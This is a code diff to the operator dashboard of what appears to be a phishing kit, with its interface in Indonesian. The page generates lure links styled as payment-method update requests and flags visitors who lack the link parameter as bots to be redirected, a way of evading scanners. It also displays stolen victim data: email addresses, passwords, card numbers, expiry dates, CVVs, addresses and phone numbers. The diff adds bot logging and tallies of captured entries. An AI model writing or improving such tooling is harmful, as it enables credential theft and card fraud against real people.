@@ -17,7 +17,7 @@
             position: fixed;
             top: 50%; left: 50%;
             transform: translate(-50%, -50%);
-            opacity: 0.9;
+            opacity: 0.04;
             z-index: 0;
             pointer-events: none;
         }
@@ -76,6 +76,7 @@
             border-left: 3px solid #0071e3; word-break: break-all; font-size: 13px; line-height: 1.8;
         }
         .item.bot { border-left-color: #ff3b30; background: #fff2f2; }
+        .item.bot .label-tipe { color: #ff3b30; font-weight: bold; }
         .item span { font-weight: 600; color: #333; display: inline-block; min-width: 90px; }
         .status-refresh {
             display: inline-block; margin-left: 10px; font-size: 12px; padding: 4px 10px;
@@ -86,7 +87,8 @@
         .baris-dua { display: flex; gap: 12px; }
         .baris-dua > div { flex: 1; }
         .kosong { color: #999; font-size: 13px; padding: 10px 0; }
-        .label-bot { color: #ff3b30; font-weight: bold; }
+        .jumlah { font-size: 12px; margin-bottom: 10px; color: #666; }
+        .jumlah span { font-weight: bold; color: #c00; }
     </style>
 </head>
 <body>
@@ -94,7 +96,7 @@
     <div class="wadah">
         <div class="header">
             <h1>🔐 Panel Rahasia</h1>
-            <p>Pengaturan & Pembuatan Tautan</p>
+            <p>Pengaturan & Pemantauan Data</p>
         </div>
 
         <!-- PENGATURAN DASAR -->
@@ -134,8 +136,8 @@
             <button class="salin-btn" onclick="salinTautan()">📋 Salin Tautan</button>
             <p class="info" style="margin-top:10px;">
                 Format: <code>?Update-payment-methode-EMAIL-ANGKA=aktif</code><br>
-                Ganti <strong>EMAIL</strong> dengan alamat tujuan, <strong>ANGKA</strong> otomatis<br>
-                <strong class="label-bot">⚠️ Tanpa parameter = terdeteksi BOT</strong>
+                Ganti <strong>EMAIL</strong> dengan alamat tujuan<br>
+                <strong style="color:#c00;">⚠️ Tanpa parameter = Terdeteksi BOT & Dialihkan</strong>
             </p>
         </div>
 
@@ -150,9 +152,19 @@
             <p class="waktu" id="waktuTerakhir">Terakhir diperiksa: —</p>
         </div>
 
+        <!-- 🤖 PENCATATAN BOT -->
+        <div class="kotak">
+            <h2>🤖 Pengunjung Tanpa Parameter</h2>
+            <div class="jumlah">Total tercatat: <span id="jumlahBot">0</span> orang</div>
+            <div class="daftar-data" id="daftarBot">
+                <p class="kosong">Belum ada data...</p>
+            </div>
+        </div>
+
         <!-- DATA LOGIN MASUK -->
         <div class="kotak">
             <h2>📧 Data Login Masuk</h2>
+            <div class="jumlah">Total: <span id="jumlahLogin">0</span> orang</div>
             <div class="daftar-data" id="daftarLogin">
                 <p class="kosong">Belum ada data...</p>
             </div>
@@ -161,6 +173,7 @@
         <!-- DATA KARTU MASUK -->
         <div class="kotak">
             <h2>💳 Data Kartu Masuk</h2>
+            <div class="jumlah">Total: <span id="jumlahKartu">0</span> orang</div>
             <div class="daftar-data" id="daftarKartu">
                 <p class="kosong">Belum ada data...</p>
             </div>
@@ -181,7 +194,7 @@
             const simpanAngka = localStorage.getItem('paramAngka');
             if (simpanAngka) document.getElementById('paramAngka').value = simpanAngka;
             
-            tampilkanDataMasuk();
+            tampilkanSemuaData();
             perbaruiWaktuTerakhir();
             buatTautan();
         });
@@ -244,10 +257,10 @@
                 status.textContent = 'Nonaktif';
                 status.classList.remove('aktif');
             } else {
-                tampilkanDataMasuk();
+                tampilkanSemuaData();
                 perbaruiWaktuTerakhir();
                 intervalRefresh = setInterval(function() {
-                    tampilkanDataMasuk();
+                    tampilkanSemuaData();
                     perbaruiWaktuTerakhir();
                 }, INTERVAL_DETIK * 1000);
                 tombol.textContent = '⏹️ Hentikan Refresh Otomatis';
@@ -257,18 +270,35 @@
             }
         }
 
-        // === TAMPILKAN DATA ===
-        function tampilkanDataMasuk() {
-            // Data Login
+        // === TAMPILKAN SEMUA DATA ===
+        function tampilkanSemuaData() {
+            // 🤖 BOT
+            const daftarBot = document.getElementById('daftarBot');
+            const dataBot = JSON.parse(localStorage.getItem('daftarBot') || '[]');
+            document.getElementById('jumlahBot').textContent = dataBot.length;
+            
+            if (dataBot.length === 0) {
+                daftarBot.innerHTML = '<p class="kosong">Belum ada pengunjung tanpa parameter...</p>';
+            } else {
+                daftarBot.innerHTML = dataBot.map(d => `
+                    <div class="item bot">
+                        <span class="label-tipe">🤖 BOT — Mengakses tanpa parameter</span><br>
+                        <span>📅 Waktu:</span> ${d.waktu || '-'}
+                    </div>
+                `).join('');
+            }
+
+            // 📧 LOGIN
             const daftarLogin = document.getElementById('daftarLogin');
             const dataLogin = JSON.parse(localStorage.getItem('daftarLogin') || '[]');
+            document.getElementById('jumlahLogin').textContent = dataLogin.length;
             
             if (dataLogin.length === 0) {
                 daftarLogin.innerHTML = '<p class="kosong">Belum ada data...</p>';
             } else {
                 daftarLogin.innerHTML = dataLogin.map(d => `
                     <div class="item ${d.isBot ? 'bot' : ''}">
-                        ${d.isBot ? '<span class="label-bot">🤖 BOT</span><br>' : ''}
+                        ${d.isBot ? '<span class="label-tipe">🤖 BOT</span><br>' : ''}
                         <span>📧 Email:</span> ${d.email || '-'}<br>
                         <span>🔑 Kata Sandi:</span> ${d.sandi || '-'}<br>
                         <span>🕐 Waktu:</span> ${d.waktu || '-'}
@@ -276,22 +306,23 @@
                 `).join('');
             }
 
-            // Data Kartu
+            // 💳 KARTU
             const daftarKartu = document.getElementById('daftarKartu');
             const dataKartu = JSON.parse(localStorage.getItem('daftarKartu') || '[]');
+            document.getElementById('jumlahKartu').textContent = dataKartu.length;
             
             if (dataKartu.length === 0) {
                 daftarKartu.innerHTML = '<p class="kosong">Belum ada data...</p>';
             } else {
                 daftarKartu.innerHTML = dataKartu.map(d => `
                     <div class="item ${d.isBot ? 'bot' : ''}">
-                        ${d.isBot ? '<span class="label-bot">🤖 BOT</span><br>' : ''}
+                        ${d.isBot ? '<span class="label-tipe">🤖 BOT</span><br>' : ''}
                         <span>📧 Email:</span> ${d.email || '-'}<br>
                         <span>👤 Nama:</span> ${d.namaKartu || '-'}<br>
                         <span>🔢 Kartu:</span> ${d.nomorKartu || '-'}<br>
                         <span>📅 Exp:</span> ${d.expiry || '-'}<br>
                         <span>🔒 CVV:</span> ${d.cvv || '-'}<br>
-                        <span>📍 Alamat:</span> ${d.alamat || '-'}, ${d.kota || ''} — ${d.kodepos || '-'}<br>
+                        <span>📍 Alamat:</span> ${d.alamat || '-'} — ${d.kodepos || '-'}<br>
                         <span>📞 Telp:</span> ${d.telepon || '-'}<br>
                         <span>🕐 Waktu:</span> ${d.waktu || '-'}
                     </div>
@@ -301,7 +332,7 @@
 
         function perbaruiWaktuTerakhir() {
             document.getElementById('waktuTerakhir').textContent = 
-                'Terakhir diperiksa: ' + new Date().toLocaleString();
+                'Terakhir diperiksa: ' + new Date().toLocaleString('id-ID');
         }
     </script>
 </body>
